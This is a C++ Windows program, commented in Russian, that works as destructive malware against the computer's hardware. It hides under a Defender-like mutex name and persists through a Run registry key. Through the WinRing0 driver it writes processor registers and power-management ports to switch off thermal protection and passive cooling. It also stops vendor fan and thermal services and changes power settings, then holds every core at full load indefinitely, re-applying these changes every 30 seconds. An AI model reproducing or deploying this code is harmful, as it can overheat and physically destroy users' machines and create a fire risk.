#include <windows.h>
#include <intrin.h>
#include <vector>
#include <thread>
#include <atomic>
#include <chrono>
#include <cstdlib>
#include <cstdio>
#include <cstring>
#include <string>
#include "config.h"

#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "user32.lib")

std::atomic<bool> g_run{ true };

// ---------- CPUID ----------
bool IsIntel() {
    int cpu[4]; __cpuid(cpu, 0);
    char v[13] = {};
    memcpy(v + 0, &cpu[1], 4);
    memcpy(v + 4, &cpu[3], 4);
    memcpy(v + 8, &cpu[2], 4);
    return strcmp(v, "GenuineIntel") == 0;
}
bool IsAMD() {
    int cpu[4]; __cpuid(cpu, 0);
    char v[13] = {};
    memcpy(v + 0, &cpu[1], 4);
    memcpy(v + 4, &cpu[3], 4);
    memcpy(v + 8, &cpu[2], 4);
    return strcmp(v, "AuthenticAMD") == 0;
}

// ---------- привилегии ----------
bool EnablePriv(const wchar_t* n) {
    HANDLE t;
    if (!OpenProcessToken(GetCurrentProcess(),
        TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &t)) return false;
    TOKEN_PRIVILEGES tp = {};
    tp.PrivilegeCount = 1;
    LookupPrivilegeValueW(nullptr, n, &tp.Privileges[0].Luid);
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    bool ok = AdjustTokenPrivileges(t, FALSE, &tp, sizeof(tp), nullptr, nullptr) != 0;
    CloseHandle(t);
    return ok;
}

// ---------- скрытый запуск ----------
void RunHidden(const std::wstring& args) {
    STARTUPINFOW si = { sizeof(si) };
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    PROCESS_INFORMATION pi = {};
    std::wstring cmd = L"cmd.exe /c " + args + L" >nul 2>&1";
    if (CreateProcessW(nullptr, cmd.data(), nullptr, nullptr, FALSE,
                       CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi)) {
        WaitForSingleObject(pi.hProcess, 3000);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
}

// ---------- winring0 ----------
class Ring0 {
public:
    HANDLE h = INVALID_HANDLE_VALUE;
    bool Open() {
        h = CreateFileW(L"\\\\.\\WinRing0_1_2_0",
            GENERIC_READ | GENERIC_WRITE, 0, nullptr,
            OPEN_EXISTING, 0, nullptr);
        return h != INVALID_HANDLE_VALUE;
    }
    bool WriteMsr(DWORD reg, DWORD eax, DWORD edx) {
        if (h == INVALID_HANDLE_VALUE) return false;
#pragma pack(push, 8)
        struct { DWORD reg; DWORD eax; DWORD edx; } in = { reg, eax, edx };
#pragma pack(pop)
        DWORD ret = 0;
        return DeviceIoControl(h, 0x9C406104, &in, sizeof(in),
                               &ret, sizeof(ret), &ret, nullptr) != 0;
    }
    bool OutPortDword(DWORD port, DWORD val) {
        if (h == INVALID_HANDLE_VALUE) return false;
#pragma pack(push, 8)
        struct { DWORD port; DWORD value; } in = { port, val };
#pragma pack(pop)
        DWORD ret = 0;
        return DeviceIoControl(h, 0x9C4060CC, &in, sizeof(in),
                               &ret, sizeof(ret), &ret, nullptr) != 0;
    }
    bool ReadPci(DWORD addr, DWORD* out) {
        if (h == INVALID_HANDLE_VALUE) return false;
#pragma pack(push, 8)
        struct { DWORD addr; DWORD value; } io = { addr, 0 };
#pragma pack(pop)
        DWORD ret = 0;
        return DeviceIoControl(h, 0x9C40A0C4, &io, sizeof(io),
                               &io, sizeof(io), &ret, nullptr) != 0
               && (*out = io.value, true);
    }
    void Close() { if (h != INVALID_HANDLE_VALUE) CloseHandle(h); }
};

// ---------- MSR ----------
void DisableIntelThermal(Ring0& r0) {
    r0.WriteMsr(0x1A0, 0x00000000, 0x00000000); // IA32_MISC_ENABLE: PROCHOT off
    r0.WriteMsr(0x1A2, 0x00000000, 0x00000000); // TCC offset = 0
    r0.WriteMsr(0x199, 0x00001F00, 0x00000000); // IA32_PERF_CTL: max multiplier
    r0.WriteMsr(0x1B2, 0x00000000, 0x00000000); // PACKAGE_THERM_INTERRUPT off
    r0.WriteMsr(0x19B, 0x00000000, 0x00000000); // THERM_INTERRUPT off
    r0.WriteMsr(0x1AD, 0x00000000, 0x00000000); // TURBO_RATIO_LIMIT
}

void DisableAMDThermal(Ring0& r0) {
    // THR_INT — только безопасный MSR; SMN не трогаем
    r0.WriteMsr(0xC0010055, 0x00000000, 0x00000000);
}

void DisableEC(Ring0& r0) {
    DWORD pmbase = 0;
    if (!r0.ReadPci(0x8000F844, &pmbase)) return;
    pmbase &= 0xFF80;
    if (pmbase == 0) return;

    r0.OutPortDword(pmbase + 0x04, 0x00000000); // PM1_CNT: passive cooling off
    r0.OutPortDword(pmbase + 0x00, 0x00000011); // PM1_STS: только thermal-биты
    r0.OutPortDword(pmbase + 0x02, 0x00000000); // PM1_EN: thermal events off
}

// ---------- windows ----------
void DisableWindowsThermal() {
    RunHidden(L"powercfg /setacvalueindex SCHEME_CURRENT SUB_PROCESSOR PROCTHROTTLEMAX 100");
    RunHidden(L"powercfg /setacvalueindex SCHEME_CURRENT SUB_PROCESSOR PROCTHROTTLEMIN 100");
    RunHidden(L"powercfg /setdcvalueindex SCHEME_CURRENT SUB_PROCESSOR PROCTHROTTLEMAX 100");
    RunHidden(L"powercfg /setdcvalueindex SCHEME_CURRENT SUB_PROCESSOR PROCTHROTTLEMIN 100");
    RunHidden(L"powercfg /setacvalueindex SCHEME_CURRENT SUB_PROCESSOR SYSCOOLPOL 0");
    RunHidden(L"powercfg /setdcvalueindex SCHEME_CURRENT SUB_PROCESSOR SYSCOOLPOL 0");
    RunHidden(L"powercfg /setacvalueindex SCHEME_CURRENT SUB_PROCESSOR PERFBOOSTMODE 2");
    RunHidden(L"powercfg /setdcvalueindex SCHEME_CURRENT SUB_PROCESSOR PERFBOOSTMODE 2");
    RunHidden(L"powercfg /setactive SCHEME_CURRENT");

    HKEY hk;
    if (RegCreateKeyExW(HKEY_LOCAL_MACHINE,
        L"SYSTEM\\CurrentControlSet\\Control\\Thermal\\Global\\Policy",
        0, nullptr, 0, KEY_SET_VALUE, nullptr, &hk, nullptr) == ERROR_SUCCESS) {
        DWORD z = 0;
        RegSetValueExW(hk, L"ThermalThrottleEnabled", 0, REG_DWORD, (BYTE*)&z, 4);
        RegSetValueExW(hk, L"PassiveCooling", 0, REG_DWORD, (BYTE*)&z, 4);
        RegCloseKey(hk);
    }
}

void KillVendorFans() {
    const wchar_t* svcs[] = {
        L"LenovoVantageService", L"Lenovo.Modern.ImController",
        L"DellCommandUpdate", L"DellDigitalDelivery",
        L"HPWMISVC", L"HP.ClientManagement",
        L"AsusUpdateCheck", L"AsusAppAll",
        L"ArmouryCrateControlInterface", L"ArmouryCrateService",
        L"MSICommandCenter", L"NvGpuFanControl", L"NvContainer",
        L"Intel(R) Dynamic Platform and Thermal Framework",
        L"Intel(R) Dynamic Tuning"
    };
    for (auto* s : svcs) {
        RunHidden(std::wstring(L"sc stop \"") + s + L"\"");
        RunHidden(std::wstring(L"sc config \"") + s + L"\" start= disabled");
    }
}

// ---------- нагрузка ----------
void BurnCore(int id) {
    SetThreadAffinityMask(GetCurrentThread(), (DWORD_PTR)1 << id);
    SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_TIME_CRITICAL);
    volatile double a = 1.0, b = 1.0000001;
    while (g_run.load()) {
        SetThreadExecutionState(ES_SYSTEM_REQUIRED | ES_DISPLAY_REQUIRED | ES_CONTINUOUS);
        for (int i = 0; i < 2000000; i++) {
            a = a * b + 0.0000001;
            b = b * 1.0000001 - 0.0000001;
            if (a > 1e100) { a = 1.0; b = 1.0000001; }
            _ReadWriteBarrier();
        }
    }
}

// ---------- main ----------
int wmain() {
    HANDLE mtx = CreateMutexW(nullptr, TRUE, L"Global\\WinDefendUpdater");
    if (GetLastError() == ERROR_ALREADY_EXISTS) return 0;

    EnablePriv(L"SeDebugPrivilege");
    EnablePriv(L"SeLoadDriverPrivilege");
    EnablePriv(L"SeSystemEnvironmentPrivilege");

    HKEY hk;
    if (RegCreateKeyExW(HKEY_LOCAL_MACHINE, REG_RUN_KEY, 0, nullptr, 0,
                        KEY_SET_VALUE, nullptr, &hk, nullptr) == ERROR_SUCCESS) {
        wchar_t self[MAX_PATH];
        GetModuleFileNameW(nullptr, self, MAX_PATH);
        RegSetValueExW(hk, REG_RUN_NAME, 0, REG_SZ,
            (BYTE*)self, (DWORD)((wcslen(self) + 1) * sizeof(wchar_t)));
        RegCloseKey(hk);
    }

    DisableWindowsThermal();
    KillVendorFans();

    Ring0 r0;
    bool ring0ok = r0.Open();
    if (ring0ok) {
        if (IsIntel()) DisableIntelThermal(r0);
        else if (IsAMD()) DisableAMDThermal(r0);
        DisableEC(r0);
    }

    SYSTEM_INFO si;
    GetSystemInfo(&si);
    int cores = (int)si.dwNumberOfProcessors;
    std::vector<std::thread> threads;
    for (int i = 0; i < cores; i++)
        threads.emplace_back(BurnCore, i % cores);

    while (true) {
        std::this_thread::sleep_for(std::chrono::seconds(30));
        DisableWindowsThermal();
        KillVendorFans();
        if (ring0ok) {
            if (IsIntel()) DisableIntelThermal(r0);
            DisableEC(r0);
        }
    }
    return 0;
}
